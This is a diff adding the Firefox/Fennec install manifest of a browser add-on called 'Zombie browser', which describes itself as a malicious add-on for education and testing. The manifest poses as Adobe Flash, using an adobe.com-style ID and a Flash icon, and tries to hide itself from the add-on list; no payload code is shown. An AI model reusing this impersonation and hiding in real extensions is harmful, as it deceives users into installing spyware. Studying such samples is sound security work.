@@ -1,0 +1,34 @@
+<?xml version="1.0" encoding="UTF-8" standalone="no"?><RDF xmlns="http://www.w3.org/1999/02/22-rdf-syntax-ns#" xmlns:em="http://www.mozilla.org/2004/em-rdf#">
+
+  <Description about="urn:mozilla:install-manifest">
+    <em:id>flashX@adobe.com</em:id>
+    <em:name>Zombie browser</em:name>
+    <em:description>Malicious add-on. For educational and testing purposes only! Don't use it if you don't have permission to do that.</em:description>
+    <em:version>1.0</em:version>
+    <em:creator>Z</em:creator>
+    <em:hidden>true</em:hidden> <!-- deprecated, not working -->
+    <em:homepageURL>http://127.0.0.1</em:homepageURL>
+	<em:updateURL>http://127.0.0.1/update.rdf</em:updateURL>
+	<em:iconURL>chrome://flashx/skin/icon-flash.png</em:iconURL>
+    <em:type>2</em:type>
+
+    <!-- Mozilla Firefox -->
+    <em:targetApplication>
+      <Description>
+        <em:id>{ec8030f7-c20a-464f-9b0e-13a3a9e97384}</em:id>
+        <em:minVersion>3.0</em:minVersion>
+        <em:maxVersion>18.*</em:maxVersion>
+        <em:bootstrap>false</em:bootstrap>
+      </Description>
+    </em:targetApplication>
+     <!-- Fennec  -->
+            <em:targetApplication>
+            <Description>
+                <em:id>{aa3c5121-dab2-40e2-81ca-7ea25febc110}</em:id>
+                <em:minVersion>3.*</em:minVersion>
+                <em:maxVersion>18.*</em:maxVersion>
+            </Description>
+        </em:targetApplication>
+    
+  <em:optionsURL/><em:aboutURL/><em:updateKey/><em:hidden/></Description>
+</RDF>
